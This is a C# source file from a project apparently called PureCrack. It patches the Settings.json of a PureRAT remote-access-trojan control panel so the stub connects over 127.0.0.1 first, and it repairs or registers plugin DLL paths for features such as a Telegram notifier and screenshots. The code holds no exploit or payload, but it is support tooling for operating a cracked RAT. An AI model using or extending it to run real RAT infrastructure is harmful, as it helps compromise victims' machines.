using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using System.Text.Json.Nodes;
using PureCrack.Util;

namespace PureCrack.Panel;

/// <summary>
/// Reads the panel's <c>Settings.json</c> (lives next to <c>PureRAT.exe</c>)
/// and reorders the <c>IPs</c> array so that <c>127.0.0.1</c> is first. This
/// fixes the failure mode we hit during the Python-kit phase: the stub iterates
/// IPs in the order the panel sends them, and if the panel's first IP is a
/// non-routable LAN address, the stub never gets to <c>127.0.0.1</c>.
///
/// Operator-friendly:
///   - Backs up the file once (<c>Settings.json.purecrack-backup</c>).
///   - No-op if 127.0.0.1 is already first.
///   - Logs a warning + skips if the JSON shape isn't what we expect.
/// </summary>
public static class SettingsAutoFix
{
    private const string Loopback = "127.0.0.1";
    private const string BackupSuffix = ".purecrack-backup";

    /// <summary>
    /// Look for Settings.json. v4.0.9596+ panels keep it under <c>panel/data/</c>;
    /// older builds dropped it as a sibling of PureRAT.exe. We probe both. Some
    /// builds also keep settings in AppData; the operator can symlink or set
    /// <c>PURE_SETTINGS_JSON</c> if the file lives somewhere weirder than that.
    /// </summary>
    public static string? FindSettingsJson(string panelExe)
    {
        var fromEnv = Environment.GetEnvironmentVariable("PURE_SETTINGS_JSON");
        if (!string.IsNullOrEmpty(fromEnv) && File.Exists(fromEnv)) return fromEnv;

        var dir = Path.GetDirectoryName(panelExe);
        if (dir == null) return null;

        // Probe order: data/ first (modern v4.0.9596+ layout), then sibling
        // (older builds). First file wins; we don't merge.
        foreach (var candidate in new[]
        {
            Path.Combine(dir, "data", "Settings.json"),
            Path.Combine(dir, "Settings.json"),
        })
        {
            if (File.Exists(candidate)) return candidate;
        }
        return null;
    }

    /// <summary>
    /// Reorder the <c>IPs</c> array so loopback is first.
    /// Returns true if a change was written.
    /// </summary>
    public static bool ReorderIpsToLoopbackFirst(string settingsPath)
    {
        if (!File.Exists(settingsPath))
        {
            Log.Warn($"settings: {settingsPath} not found");
            return false;
        }

        string json;
        try { json = File.ReadAllText(settingsPath); }
        catch (Exception ex)
        {
            Log.Warn($"settings: read failed: {ex.Message}");
            return false;
        }

        JsonNode? root;
        try { root = JsonNode.Parse(json); }
        catch (Exception ex)
        {
            Log.Warn($"settings: not valid JSON: {ex.Message}");
            return false;
        }

        if (root is not JsonObject obj)
        {
            Log.Warn("settings: top-level isn't a JSON object — skipping reorder");
            return false;
        }

        // Find the IPs array. Different builds may use different casing
        // (IPs / IPS / Ips / ips) — accept any.
        string? ipsKey = null;
        JsonArray? ipsArr = null;
        foreach (var kv in obj)
        {
            if (string.Equals(kv.Key, "IPs", StringComparison.OrdinalIgnoreCase)
                && kv.Value is JsonArray arr)
            {
                ipsKey = kv.Key;
                ipsArr = arr;
                break;
            }
        }
        if (ipsKey == null || ipsArr == null)
        {
            Log.Warn("settings: no IPs array — skipping reorder");
            return false;
        }

        if (ipsArr.Count > 0 && string.Equals(ipsArr[0]?.GetValue<string>(), Loopback))
        {
            Log.Info($"settings: {Loopback} already first in {ipsKey}");
            return false;
        }

        // Build the reordered array. Loopback first; preserve all other entries
        // in their original order (and de-dup loopback if it appeared later).
        var ordered = new List<string> { Loopback };
        foreach (var node in ipsArr)
        {
            if (node == null) continue;
            var s = node.GetValue<string>();
            if (!string.Equals(s, Loopback, StringComparison.Ordinal))
                ordered.Add(s);
        }

        // Backup once.
        var backup = settingsPath + BackupSuffix;
        if (!File.Exists(backup))
        {
            try { File.Copy(settingsPath, backup); }
            catch (Exception ex) { Log.Warn($"settings: backup failed: {ex.Message}"); }
        }

        // Replace the array, preserving all other JSON content.
        var newArr = new JsonArray();
        foreach (var s in ordered) newArr.Add(s);
        obj[ipsKey] = newArr;

        // Copy-construct from .Default so we inherit DefaultJsonTypeInfoResolver.
        // System.Text.Json 8.0+ throws InvalidOperationException("must specify
        // a TypeInfoResolver") when ToJsonString() walks a JsonValueCustomized<T>
        // (the type produced by JsonNode.Parse for parsed values) with options
        // that have no resolver. A bare `new JsonSerializerOptions()` is the
        // exact shape that triggers it. This crash hit users whose Settings.json
        // had non-loopback-first IPs (the only path that calls ToJsonString in
        // ReorderIps), which is why it looked random.
        var output = obj.ToJsonString(new JsonSerializerOptions(JsonSerializerOptions.Default) { WriteIndented = true });
        try { File.WriteAllText(settingsPath, output); }
        catch (Exception ex)
        {
            Log.Err($"settings: write failed: {ex.Message}");
            return false;
        }
        Log.Ok($"settings: reordered {ipsKey} → [{string.Join(",", ordered)}]");
        return true;
    }

    // ============================================================================
    // CustomPlugins path repair
    // ============================================================================
    //
    // ROOT CAUSE this fixes (the panel-side EnumPlugins crash):
    //
    // PureRAT's panel reads <c>CustomPlugins[].FilePath</c> from Settings.json
    // at startup and Assembly.LoadFrom's each entry. The ICustomPlugin (e.g.
    // PureHelper.dll) registers feature plugins (Telegram notifier, screenshot
    // thumbnails, the rest of the 37 client DLLs) into the panel's plugin
    // registry. If the FilePath is wrong, LoadFrom fails silently — the plugin
    // never registers — and any UI button whose click handler does
    // <c>plugins.First(p => p.Name == "Whatever")</c> blows up with
    // "Sequence contains no matching element" the moment the user clicks it.
    //
    // The Settings.json shipped from earlier builds had a hardcoded absolute
    // path baked in from the developer's box. Operators install PureCrack at
    // a different path; the absolute reference is stale; plugins fail to load.
    //
    // This method:
    //   1. Scans <panel>/Plugins/ for *.dll (excluding *.Client.dll, which is
    //      auto-loaded by its parent ICustomPlugin and not a registered plugin
    //      itself).
    //   2. Walks every CustomPlugins[].FilePath. If the file doesn't exist,
    //      we look for <Name>.dll (or <basename>.dll) in panel/Plugins/ and
    //      rewrite the FilePath to the absolute path on this machine.
    //   3. Backfills missing CustomPlugins entries for any DLLs in
    //      panel/Plugins/ that aren't represented at all — so a fresh
    //      install with no Settings.json customisation still gets PureHelper
    //      registered.
    //
    // Returns true if any change was written.

    public static bool FixPluginPaths(string settingsPath, string panelExe)
    {
        if (!File.Exists(settingsPath))
        {
            Log.Warn($"plugin-fix: {settingsPath} not found");
            return false;
        }

        var pluginsDir = Path.Combine(Path.GetDirectoryName(panelExe) ?? "", "Plugins");
        if (!Directory.Exists(pluginsDir))
        {
            Log.Info($"plugin-fix: no Plugins dir at {pluginsDir} — skipping");
            return false;
        }

        // Discover every panel plugin DLL on disk. Skip *.Client.dll: those are
        // client-side feature DLLs auto-loaded by their parent ICustomPlugin
        // (e.g. PureHelper.Client.dll is loaded by PureHelper.dll), not panel
        // plugins themselves.
        var availablePlugins = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var dll in Directory.GetFiles(pluginsDir, "*.dll"))
        {
            var name = Path.GetFileNameWithoutExtension(dll);
            if (name.EndsWith(".Client", StringComparison.OrdinalIgnoreCase)) continue;
            availablePlugins[name] = Path.GetFullPath(dll);
        }
        if (availablePlugins.Count == 0)
        {
            Log.Info($"plugin-fix: no plugin DLLs in {pluginsDir} — skipping");
            return false;
        }

        string json;
        try { json = File.ReadAllText(settingsPath); }
        catch (Exception ex)
        {
            Log.Warn($"plugin-fix: read failed: {ex.Message}");
            return false;
        }

        JsonNode? root;
        try { root = JsonNode.Parse(json); }
        catch (Exception ex)
        {
            Log.Warn($"plugin-fix: not valid JSON: {ex.Message}");
            return false;
        }
        if (root is not JsonObject obj)
        {
            Log.Warn("plugin-fix: top-level isn't a JSON object — skipping");
            return false;
        }

        // Find or create the CustomPlugins array. Different panel builds may
        // capitalise the key differently; preserve the existing key when found.
        string customKey = "CustomPlugins";
        JsonArray? customArr = null;
        foreach (var kv in obj)
        {
            if (string.Equals(kv.Key, "CustomPlugins", StringComparison.OrdinalIgnoreCase)
                && kv.Value is JsonArray arr)
            {
                customKey = kv.Key;
                customArr = arr;
                break;
            }
        }
        if (customArr == null)
        {
            customArr = new JsonArray();
            obj[customKey] = customArr;
        }

        // Track which plugins already have entries (by Name) so we know which
        // disk-DLLs to backfill at the end.
        var representedNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var changed = 0;

        // Pass 1: repair existing entries with broken FilePath.
        for (int i = 0; i < customArr.Count; i++)
        {
            if (customArr[i] is not JsonObject entry) continue;

            var entryName = TryReadString(entry["Name"]);
            var entryPath = TryReadString(entry["FilePath"]);

            if (entryName != null) representedNames.Add(entryName);

            // Existing FilePath good? Nothing to do.
            if (!string.IsNullOrEmpty(entryPath) && File.Exists(entryPath)) continue;

            // Try to match by Name first (the canonical link), then by
            // filename basename if the entry is missing Name.
            string? lookup = entryName
                          ?? (entryPath != null ? Path.GetFileNameWithoutExtension(entryPath) : null);
            if (lookup == null) continue;

            if (availablePlugins.TryGetValue(lookup, out var fixedPath))
            {
                entry["FilePath"] = fixedPath;
                if (string.IsNullOrEmpty(entryName)) entry["Name"] = lookup;
                changed++;
                Log.Bullet($"plugin-fix: {lookup} → {fixedPath}");
            }
            else
            {
                Log.Warn($"plugin-fix: entry references {lookup} but no matching DLL in Plugins/");
            }
        }

        // Pass 2: backfill any disk DLL that has no Settings.json entry. This
        // covers the "fresh install, no CustomPlugins ever set up" case so
        // PureHelper gets registered without operator action.
        foreach (var kv in availablePlugins)
        {
            if (representedNames.Contains(kv.Key)) continue;
            var newEntry = new JsonObject
            {
                ["Name"] = kv.Key,
                ["FilePath"] = kv.Value,
            };
            customArr.Add(newEntry);
            changed++;
            Log.Bullet($"plugin-fix: registered {kv.Key} → {kv.Value}");
        }

        if (changed == 0)
        {
            Log.Info("plugin-fix: nothing to repair");
            return false;
        }

        // Backup once before writing.
        var backup = settingsPath + BackupSuffix;
        if (!File.Exists(backup))
        {
            try { File.Copy(settingsPath, backup); }
            catch (Exception ex) { Log.Warn($"plugin-fix: backup failed: {ex.Message}"); }
        }

        // Copy-construct from .Default so we inherit DefaultJsonTypeInfoResolver.
        // System.Text.Json 8.0+ throws InvalidOperationException("must specify
        // a TypeInfoResolver") when ToJsonString() walks a JsonValueCustomized<T>
        // (the type produced by JsonNode.Parse for parsed values) with options
        // that have no resolver. A bare `new JsonSerializerOptions()` is the
        // exact shape that triggers it. This crash hit users whose Settings.json
        // had non-loopback-first IPs (the only path that calls ToJsonString in
        // ReorderIps), which is why it looked random.
        var output = obj.ToJsonString(new JsonSerializerOptions(JsonSerializerOptions.Default) { WriteIndented = true });
        try { File.WriteAllText(settingsPath, output); }
        catch (Exception ex)
        {
            Log.Err($"plugin-fix: write failed: {ex.Message}");
            return false;
        }
        Log.Ok($"plugin-fix: {changed} entr{(changed == 1 ? "y" : "ies")} updated in {customKey}");
        return true;
    }

    /// <summary>
    /// Best-effort string extract from a <see cref="JsonNode"/>. Returns null
    /// when the node is null, isn't a value, or isn't representable as a
    /// string. Lets us walk untrusted Settings.json shapes without throwing
    /// on the first wrong-typed field.
    /// </summary>
    private static string? TryReadString(JsonNode? node)
    {
        if (node is null) return null;
        try { return node.GetValue<string>(); }
        catch { return null; }
    }
}
